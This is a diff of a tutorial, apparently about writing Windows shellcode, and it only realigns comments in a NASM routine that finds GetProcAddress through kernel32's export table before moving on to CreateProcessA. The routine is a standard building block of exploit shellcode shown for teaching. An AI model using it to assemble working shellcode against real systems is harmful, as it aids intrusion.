@@ -26,26 +26,26 @@ this 3 elements are enough to find our function. The concept is to load the ```A
 
 ```nasm
 getProcAddress:
-	inc ecx 							; ordinals increment
-	lodsd								; get "address of name" in eax
+	inc ecx                             ; ordinals increment
+	lodsd                               ; get "address of name" in eax
 	add eax, ebx				
-	cmp dword [eax], 0x50746547			; GetP
+	cmp dword [eax], 0x50746547         ; GetP
 	jnz getProcAddress
-	cmp dword [eax + 0x4], 0x41636F72	; rocA
+	cmp dword [eax + 0x4], 0x41636F72   ; rocA
 	jnz getProcAddress
-	cmp dword [eax + 0x8], 0x65726464	; ddre
+	cmp dword [eax + 0x8], 0x65726464   ; ddre
 	jnz getProcAddress
 
 getProcAddressFunc:
-	mov esi, [edx + 0x24]		; offset ordinals
-	add esi, ebx 				; pointer to the name ordinals table
-	mov cx, [esi + ecx * 2] 	; CX = Number of function
+	mov esi, [edx + 0x24]       ; offset ordinals
+	add esi, ebx                ; pointer to the name ordinals table
+	mov cx, [esi + ecx * 2]     ; CX = Number of function
 	dec ecx
-	mov esi, [edx + 0x1c]    	; ESI = Offset address table
-	add esi, ebx             	; we placed at the begin of AddressOfFunctions array
-	mov edx, [esi + ecx * 4] 	; EDX = Pointer(offset)
-	add edx, ebx             	; EDX = getProcAddress
-	mov ebp, edx 				; save getProcAddress in EBP for future purpose
+	mov esi, [edx + 0x1c]       ; ESI = Offset address table
+	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
+	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
+	add edx, ebx                ; EDX = getProcAddress
+	mov ebp, edx                ; save getProcAddress in EBP for future purpose
 ```
 Now we can user the ```GetProcAddress``` to find the other function needed: ```CreateProcessA```.<br>
 To do that we push the name of the new function on the stack and we call the ```GetProcAddress``` to save the ```CreateProcessA``` function pointer address in the EAX register. 
